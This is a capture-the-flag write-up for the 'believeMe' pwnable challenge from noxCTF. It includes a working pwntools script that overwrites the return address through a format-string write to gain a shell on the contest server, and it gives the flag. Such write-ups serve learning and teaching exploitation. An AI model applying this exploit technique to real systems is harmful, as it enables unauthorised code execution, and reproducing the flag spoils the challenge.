# **believeMe**

#### tag : pwnable

-----------------------------------------------

#### Description

>What is going on here ? I don't believe you... you are crazy !!!
>
>(No ASLR)
>
>nc 18.223.228.52 13337
>
>believeMe

-----------------------------------------------

#### Solution

Because there is no ASLR, I can get ret's address from connection.

And I overwrite ret's address to address of `system("/bin/sh")`.

Here is solution script, [solve.py](./solve.py).

~~~

from pwn import *

### DEBUGGING ###

DEBUG = False

if DEBUG:
    r = process('believeMe')
    timeout = 0.1

    context.log_level = 'debug'
#    gdb.attach(r,'''
#    break *0x080487d3\n
#    ''')
else :
    r = remote('18.223.228.52',13337)
    timeout = 0.3

def rr(s):
    return r.recvuntil(s)

def ss(s):
    return r.sendline(s)

### ADDRESS ###

ret = 0xffffdd2c
flag = 0x0804867b

### PAYLOAD ###

payload = fmtstr_payload(9, {ret: flag}, numbwritten=0, write_size='short')

### EXPLOIT ###

rr('? ')

ss(payload)

rr('\n')

r.interactive()

#noxCTF{%N3ver_%7rust_%4h3_%F0rmat}

~~~

**noxCTF{%N3ver_%7rust_%4h3_%F0rmat}**
